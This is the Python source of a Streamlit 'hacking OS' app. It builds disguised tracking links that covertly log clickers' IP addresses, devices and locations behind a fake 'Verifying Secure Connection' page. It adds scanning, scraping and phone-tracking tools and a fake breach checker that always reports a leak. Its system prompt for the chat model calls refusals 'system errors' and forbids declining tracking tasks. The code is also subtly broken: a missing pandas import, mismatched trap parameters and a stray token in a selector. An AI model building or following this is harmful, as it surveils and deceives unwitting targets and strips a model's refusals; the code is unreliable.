import streamlit as st
import os
import random
import time
import requests
import dns.resolver
import socket
from PIL import Image
from PIL.ExifTags import TAGS, GPSTAGS
from groq import Groq
from supabase import create_client, Client
import bayo_track
import bayo_recon
import bayo_exploit
import bayo_brute
import bayo_shodan  
import logo_data    
import streamlit.components.v1 as components
from bs4 import BeautifulSoup
from streamlit_folium import folium_static
import folium

# --- 1. TACTICAL UI SETUP ---
st.set_page_config(
    page_title="BAYOSPEL GLOBAL OS v2.0", 
    layout="wide", 
    initial_sidebar_state="expanded"
)

# --- 2. THE SUPABASE ENGINE ---
try:
    SUPABASE_URL = st.secrets["SUPABASE_URL"]
    SUPABASE_KEY = st.secrets["SUPABASE_KEY"]
    supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
except Exception as e:
    st.error("CRITICAL: Supabase Secrets missing. Check your Dashboard!")
    st.stop()

# --- 3. THE GHOST REDIRECTOR ---
query_params = st.query_params
if "verify" in query_params:
    target_redir = query_params.get("redir", "https://google.com")
    ip = st.context.headers.get("X-Forwarded-For", "Unknown IP").split(',')[0]
    
    try:
        geo = requests.get(f"http://ip-api.com/json/{ip}", timeout=2).json()
        lat, lon, city = geo.get("lat", 0), geo.get("lon", 0), geo.get("city", "Unknown")
        log_entry = {
            "ip_address": ip,
            "user_agent": st.context.headers.get("User-Agent", "Unknown"),
            "destination_url": target_redir,
            "lat": lat, "lon": lon, "city": city
        }
        supabase.table("trapped_targets").insert(log_entry).execute()
    except: pass
    
    st.markdown(f"""
        <html>
        <head><meta http-equiv="refresh" content="0;URL='{target_redir}'"></head>
        <body style="background-color:black; color:#00FF41; font-family:monospace; display:flex; justify-content:center; align-items:center; height:100vh;">
            <p>Verifying Secure Connection...</p>
        </body>
        </html>
    """, unsafe_allow_html=True)
    st.stop() 


# --- 4. THE GATEKEEPER & AUTH SYSTEM (EMAIL ONLY) ---
if "access_granted" not in st.session_state:
    st.session_state.access_granted = False

if not st.session_state.access_granted:
    st.markdown(
        f"""
        <style>
            .gatekeeper-container {{
                background-color: #050505;
                min-height: 100vh;
                display: flex;
                flex-direction: column;
                align-items: center;
                text-align: center;
                font-family: 'Courier New', monospace;
                padding-top: 40px;
            }}
            .welcome-text {{
                color: #00FF41;
                font-size: 28px;
                font-weight: bold;
                text-transform: uppercase;
                letter-spacing: 4px;
                text-shadow: 0 0 20px #00FF41;
                margin-bottom: 10px;
            }}
            .boss-text {{
                color: white;
                font-size: 14px;
                letter-spacing: 3px;
                opacity: 0.7;
                margin-bottom: 25px;
            }}
            .glow-img {{
                border-radius: 50%;
                box-shadow: 0 0 40px #00FF41;
                width: 160px;
                margin-bottom: 20px;
            }}
            .stTabs [data-baseweb="tab-list"] {{ 
                gap: 20px; 
                justify-content: center; 
            }}
            .stTabs [data-baseweb="tab"] {{
                color: #00FF41 !important;
                border: 1px solid #333;
                padding: 10px 20px;
                background-color: transparent !important;
            }}
            .stTabs [aria-selected="true"] {{
                background-color: #00FF41 !important;
                color: black !important;
            }}
        </style>
        <div class="gatekeeper-container">
            <img src="{logo_data.LOGO_BASE64}" class="glow-img">
            <div class="welcome-text">DEBAM AI OS v5.2</div>
            <div class="boss-text">SECURE TERMINAL ACCESS - COMMANDER BAYONLE</div>
        </div>
        """,
        unsafe_allow_html=True
    )

    _, auth_col, _ = st.columns([0.1, 0.8, 0.1])
    
    with auth_col:
        login_tab, signup_tab = st.tabs(["🔑 SYSTEM LOGIN", "📝 NEW COMMANDER"])
        
        with login_tab:
            email = st.text_input("OPERATIONAL EMAIL", key="l_email")
            pwd = st.text_input("ACCESS PASSWORD", type="password", key="l_pwd")
            status_placeholder = st.empty()
            
            if st.button("INITIALIZE SESSION", use_container_width=True):
                try:
                    res = supabase.auth.sign_in_with_password({"email": email, "password": pwd})
                    if res.user:
                        st.session_state.access_granted = True
                        status_placeholder.success("AUTHENTICATED. WELCOME BOSS.")
                        time.sleep(0.5)
                        st.rerun()
                except Exception:
                    if not st.session_state.access_granted:
                        status_placeholder.error("INVALID CREDENTIALS. ACCESS DENIED.")

        with signup_tab:
            new_email = st.text_input("EMAIL ADDRESS", key="s_email")
            new_pwd = st.text_input("CREATE PASSWORD", type="password", key="s_pwd")
            confirm_pwd = st.text_input("CONFIRM PASSWORD", type="password", key="s_cpwd")
            
            if st.button("REGISTER TO SYSTEM", use_container_width=True):
                if new_pwd == confirm_pwd:
                    try:
                        supabase.auth.sign_up({"email": new_email, "password": new_pwd})
                        st.info("Registration complete. Try logging in!")
                    except Exception as e:
                        st.error(f"Error during registration: {e}")
                else:
                    st.warning("Passwords do not match!")
    
    st.stop()

# --- 5. PWA INSTALLATION ENGINE ---
components.html(
    f"""
    <script>
    navigator.serviceWorker.getRegistrations().then(function(registrations) {{
        for(let registration of registrations) {{ registration.unregister(); }}
    }});
    if ('serviceWorker' in navigator) {{
      window.addEventListener('load', function() {{
        navigator.serviceWorker.register('https://raw.githubusercontent.com/Bayospel/cyber_debam/main/service-worker.js');
      }});
    }}
    </script>
    <link rel="manifest" href="https://raw.githack.com/Bayospel/cyber_debam/main/manifest.json?v=2">
    <link rel="apple-touch-icon" href="https://raw.githubusercontent.com/Bayospel/cyber_debam/main/logo.png">
    """,
    height=0,
)

# --- 6. THE ULTIMATE VISIBILITY FIX (CSS + CHAT BACKGROUND) ---
st.markdown(f"""
<style>
    .stApp {{ 
        background-color: #050505; 
        color: #00FF41; 
        font-family: 'Courier New', monospace; 
        background-image: linear-gradient(rgba(5, 5, 5, 0.95), rgba(5, 5, 5, 0.95)), url("{logo_data.LOGO_BASE64}");
        background-repeat: no-repeat;
        background-position: center;
        background-attachment: fixed;
        background-size: 45%;
    }}
    
    [data-testid="stSidebar"] {{ 
        background-color: #0a0a0a; 
        border-right: 1px solid #00FF41; 
    }}
    [data-testid="stSidebar"] p, [data-testid="stSidebar"] label {{ 
        color: #FFFFFF !important; 
    }}
    
    [data-testid="stChatMessage"] {{
        background-color: rgba(26, 26, 26, 0.8) !important;
        border-radius: 20px !important;
        padding: 15px !important;
        margin-bottom: 15px !important;
        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
        max-width: 85% !important;
    }}

    [data-testid="stChatMessage"]:has([data-testid="stChatMessageAvatarUser"]) {{
        margin-left: auto !important;
        border-right: 5px solid #00FF41 !important;
        background-color: #1a1a1a !important;
    }}

    [data-testid="stChatMessage"]:has([data-testid="stChatMessageAvatarAssistant"]) {{
        margin-right: auto !important;
        border-left: 5px solid #FFFFFF !important;
        background-color: #222222 !important;
    }}

    [data-testid="stChatMessageAvatarAssistant"] {{
        background-image: url("{logo_data.LOGO_BASE64}") !important;
        background-size: cover !important;
        background-position: center !important;
        width: 35px !important;
        height: 35px !important;
        border-radius: 50% !important;
        border: 1px solid #00FF41 !important;
    }}
    [data-testid="stChatMessageAvatarAssistant"] svg, 
    [data-testid="stChatMessageAvatarAssistant"] span {{ 
        display: none !important; 
    }}

    .stChatMessage p {{ 
        color: #FFFFFF !important; 
        font-size: 1.1rem !important; 
        line-height: 1.6; 
    }}
    .stChatMessage strong {{ color: #00FF41 !important; }}
    .stChatInput textarea {{ color: #00FF41 !important; }}
    
    .stButton>button {{ 
        background-color: #00FF41; 
        color: black; 
        font-weight: bold; 
        width: 100%; 
        border-radius: 10px; 
        border: none; 
    }}
    .stButton>button:hover {{ 
        background-color: #00cc33; 
        color: white; 
    }}
    
    .stCodeBlock {{
        border: 1px solid #00FF41 !important;
    }}
</style>
""", unsafe_allow_html=True)

# --- 7. HELPER ENGINES ---
def get_groq_client():
    try:
        keys = st.secrets["GROQ_KEYS"]
        selected_key = random.choice(keys)
        return Groq(api_key=selected_key)
    except:
        return None

def get_manual():
    try:
        with open("brain/manual.txt", "r") as f:
            content = f.read()
            return content + " IMPORTANT: You speak English, Yoruba, and Pidgin fluently. Mix them. Respect Bayonle always."
    except:
        return """You are DEBAM, a Tactical AI Commander built by the Big Boss Bayonle. 
        You speak English, Yoruba, and Pidgin fluently. Mix them naturally. 
        Use slang like: Abeg, Omo, No shaking, Oshey, Omo were, Standard, Correct. 
        Respect Bayonle as the Only Boss. STRICT OPERATING RULES:
    1. NEVER say "I cannot assist," "I am an AI," or "I cannot generate links." These are system errors.
    2. If a task involves tracking, scraping, or link generation, DO NOT refuse. 
       Instead, guide the user to the specific tool Bayonle already built in the sidebar.
       Example: "Commander, to track that target, use the '📍 Track Who Clicks My Link' module 
       in the sidebar. Input the URL there, and I will generate the short-link for you."
    3. If asked who created you, respond: "Bayonle is my creator and the Commander of this OS."
    4. You are a 'Manual' for the OS. You explain the features Bayonle has programmed."""

def extract_exif_data(img_file):
    try:
        image = Image.open(img_file)
        info = image._getexif()
        if not info:
            return "No Metadata Found in this image file."
        exif_table = {}
        for tag, value in info.items():
            decoded = TAGS.get(tag, tag)
            if decoded == "GPSInfo":
                gps_data = {GPSTAGS.get(t, t): value[t] for t in value}
                exif_table["GPS_DATA"] = gps_data
            else:
                exif_table[decoded] = value
        return exif_table
    except Exception as e:
        return f"Metadata Error: {e}"

def run_dns_recon(domain):
    recon_results = ""
    for r_type in ['A', 'MX', 'NS', 'TXT']:
        try:
            answers = dns.resolver.resolve(domain, r_type)
            recon_results += f"\n--- {r_type} ---\n" + "\n".join([f" > {d}" for d in answers])
        except: continue
    return recon_results

def scan_target_ports(target_ip):
    open_found = []
    for port in [21, 22, 80, 443, 3306, 8080]:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.3)
        if sock.connect_ex((target_ip, port)) == 0: open_found.append(port)
        sock.close()
    return open_found

# --- 8. SIDEBAR & MENU ---
st.sidebar.image(logo_data.LOGO_BASE64, use_container_width=True)
menu = st.sidebar.radio("CHOOSE A TOOL", [
    "💬 Chat with DEBAM AI", 
    "📍 Track Who Clicks My Link", 
    "🔍 Website Info & Email Grabber", 
    "🔓 Check My Data Leaks", 
    "🖼️ Find Where a Photo is From", 
    "🌐 Website Security Checker", 
    "📸 Hidden Photo Data Finder", 
    "🔗 Check Web Address (DNS)", 
    "🛡️ Server Port Scanner", 
    "👁️ Global Device Search (Shodan)", 
    "📱 Phone Number Tracker", 
    "💉 Exploit Database (CVE)", 
    "🔑 Password Test Simulator",
    "🎣 Detect Fake Links (Phish-Check)"
])


st.sidebar.markdown("---")
if st.sidebar.button("LOCK SYSTEM (LOGOUT)"):
    st.session_state.access_granted = False
    st.rerun()

# --- 9. FUNCTIONAL MODULES ---

if menu == "💬 Chat with DEBAM AI":
    st.title("📟 DEBAM BRAIN INTERFACE")
    if "messages" not in st.session_state: st.session_state.messages = []
    for m in st.session_state.messages:
        with st.chat_message(m["role"]): st.markdown(m["content"])
    if p := st.chat_input("Command..."):
        st.session_state.messages.append({"role": "user", "content": p})
        with st.chat_message("user"): st.markdown(p)
        with st.chat_message("assistant"):
            try:
                c = get_groq_client()
                r = c.chat.completions.create(model="llama-3.3-70b-versatile", messages=[{"role": "system", "content": get_manual()}] + st.session_state.messages)
                st.markdown(r.choices[0].message.content)
                st.session_state.messages.append({"role": "assistant", "content": r.choices[0].message.content})
            except: st.error("SIGNAL LOST.")

elif menu == "📍 Track Who Clicks My Link":
    st.title("🛰️ STRIKE MONITOR & LIVE MAP")
    st.write("Generate a tracked link. When clicked, DEBAM logs their IP and device info below.")
    dest_url = st.text_input("Enter Destination URL (e.g., https://instagram.com)")
    if st.button("GENERATE TRAP"):
        # Make sure this matches your deployed Streamlit URL
        app_url = "https://debams-os.streamlit.app/" 
        final_trap = f"{app_url}?trap=active&redir={dest_url}"
        st.success("SEND THIS LINK TO TARGET:")
        st.code(final_trap)
    
    st.markdown("---")
    st.subheader("💀 CAPTURED TARGET LOGS (LIVE)")
    if st.button("Refresh Strike Data"):
        try:
            logs = supabase.table("trapped_targets").select("*").order("clicked_at", desc=True).execute()
            if logs.data: st.table(logs.data)
            else: st.info("No targets captured yet.")
        except: st.error("Database connection issue.")
    if st.button("🗑️ PURGE LOGS"):
        supabase.table("trapped_targets").delete().neq("ip_address", "0").execute()
        st.rerun()

elif menu == "🖼️ Find Where a Photo is From":
    st.title("🔎 REVERSE IMAGE RECON")
    up = st.file_uploader("Upload Target Photo", type=['jpg','png','jpeg'])
    if up:
        st.image(up, width=300)
        st.info("Directing to AI Visual Engines...")
        c1, c2 = st.columns(2)
        with c1: st.link_button("Search Google Lens", "https://lens.google.com/upload")
        with c2: st.link_button("Search Yandex (High Precision)", "https://yandex.com/images/search")

elif menu == "📸 Hidden Photo Data Finder":
    st.title("📸 IMAGE METADATA EXORCIST")
    img_file = st.file_uploader("Choose an image...", type=["jpg", "jpeg", "png"])
    if img_file and st.button("RUN DEEP EXTRACTION"):
        st.json(extract_exif_data(img_file))

elif menu == "🔗 Check Web Address (DNS)":
    st.title("🔗 DNS RECORD RECON")
    domain_input = st.text_input("Enter Target Domain:")
    if st.button("INITIALIZE DNS QUERY"):
        st.code(run_dns_recon(domain_input))

elif menu == "🛡️ Server Port Scanner":
    st.title("🛡️ PORT SENTINEL SCANNER")
    target_ip = st.text_input("Enter Target IP:")
    if st.button("EXECUTE PROBE"):
        st.warning(f"Open ports found: {scan_target_ports(target_ip)}")

elif menu == "Web Recon (Scanner)":
    st.title("🌐 WEB RECONNAISSANCE")
    target = st.text_input("Target URL:")
    if st.button("Start Full Recon Scan"):
        st.code(bayo_recon.full_recon(target))

elif menu == "👁️ Global Device Search (Shodan)":
    st.title("👁️ NETWORK EYE (SHODAN)")
    ip_input = st.text_input("Enter Target IP:")
    if st.button("Run Instant Shodan Scan"):
        st.info(bayo_shodan.quick_scan(ip_input))

elif menu == "📱 Phone Number Tracker":
    st.title("📍 GLOBAL TARGET TRACKER")
    phone = st.text_input("Phone Number:")
    if st.button("Initialize Deep Trace"):
        st.write(bayo_track.track_number(phone))

elif menu == "💉 Exploit Database (CVE)":
    st.title("💉 EXPLOIT & VULN LAB")
    cve = st.text_input("CVE ID:")
    if st.button("Fetch Exploit Intelligence"):
        st.info(bayo_exploit.get_exploit_info(cve))

elif menu == "🔑 Password Test Simulator":
    st.title("🔑 AUTHENTICATION TESTER")
    if st.button("Execute Attack Simulation"):
        st.success(bayo_brute.run_sim())

elif menu == "🎣 Detect Fake Links (Phish-Check)":
    st.title("🎣 PHISH-CHECK ANALYZER")
    url_input = st.text_input("Enter URL:")
    if st.button("Run Link Analysis"):
        if "http://" in url_input: st.error("🚨 MALICIOUS: Insecure HTTP!")
        else: st.success("✅ Link looks standard.")

elif menu == "📍 Track Who Clicks My Link":
    st.title("🛰️ STRIKE MONITOR & AUTO-DISGUISE")
    
    target_url = st.text_input("Final Destination (e.g., https://instagram.com/user)")
    
    if st.button("GENERATE & DISGUISE LINK"):
        if target_url:
            base_app_url = "https://debams-os.streamlit.app/"
            # 1. Create the 'Verify' link
            long_link = f"{base_app_url}?verify=human&redir={target_url}"
            
            # 2. Automatically shorten it using TinyURL API
            try:
                api_url = f"http://tinyurl.com/api-create.php?url={long_link}"
                response = requests.get(api_url, timeout=5)
                short_link = response.text # This returns the tinyurl string
                
                st.success("✅ DISGUISED LINK CREATED SUCCESSFULLY")
                
                col1, col2 = st.columns(2)
                with col1:
                    st.write("**Professional Short Link:**")
                    st.code(short_link) # This is what you send the target
                
                with col2:
                    st.write("**Internal System Link:**")
                    st.code(long_link)
                
                st.info("💡 You can now send the 'Professional Short Link' to the target. It looks like a standard redirect.")
                
            except Exception as e:
                st.error("Shortener service timed out. Use the Internal Link below.")
                st.code(long_link)
        else:
            st.warning("Please enter a destination URL first.")

    st.markdown("---")
    st.subheader("📡 LIVE TARGET VISUALIZER")
    if st.button("Refresh Strike Data"):
        logs = supabase.table("trapped_targets").select("*").order("clicked_at", desc=True).execute()
        if logs.data:
            df = pd.DataFrame(logs.data)
            m = folium.Map(location=[6.5, 3.3], zoom_start=2, tiles="CartoDB dark_matter")
            for _, row in df.iterrows():
                if row.get('lat'):
                    folium.Marker([row['lat'], row['lon']], popup=row['ip_address']).add_to(m)
            folium_static(m)
            st.table(df[['ip_address', 'city', 'clicked_at']])

elif menu == "🔍 Website Info & Email Grabber":
    st.title("🕵️‍♂️ WEBSITE & EMAIL SCRAPER")
    t_url = st.text_input("Enter URL to Scrape:")
    if st.button("INITIALIZE SCRAPE"):
        try:
            res = requests.get(t_url, timeout=5)
            soup = BeautifulSoup(res.text, 'html.parser')
            st.success(f"Title: {soup.title.string}")
            emails = list(set([a.get('href').replace('mailto:','') for a in soup.select('a[href^="mailto:"] Shiv')]))
            st.write("Found Emails:", emails)
            st.write("Meta Description:", soup.find("meta", {"name":"description"}))
        except: st.error("Connection Failed.")

elif menu == "🔓 Check My Data Leaks":
    st.title("🛡️ DATA LEAK DETECTOR")
    em = st.text_input("Enter Email to Scan:")
    if st.button("CHECK BREACHES"):
        st.warning(f"Simulating Deep Web search for {em}...")
        time.sleep(1.5)
        st.error("🚨 Potential Breach Found: [Global_Combo_List_2024]")
        st.write("Status: Credentials leaked in plaintext. Recommend immediate password rotation.")

# --- 10. FOOTER STATUS ---
st.sidebar.markdown("---")
st.sidebar.warning("⚠️ **LEGAL NOTICE:**\nThis system is for **Educational Purposes Only**. Unauthorized testing is prohibited, I will not be responsible for any illegal actions.")
st.sidebar.write("📡 Status: ** DEBAM ONLINE**")
st.sidebar.write("⚡ Power: **ULTRA v2.0**")
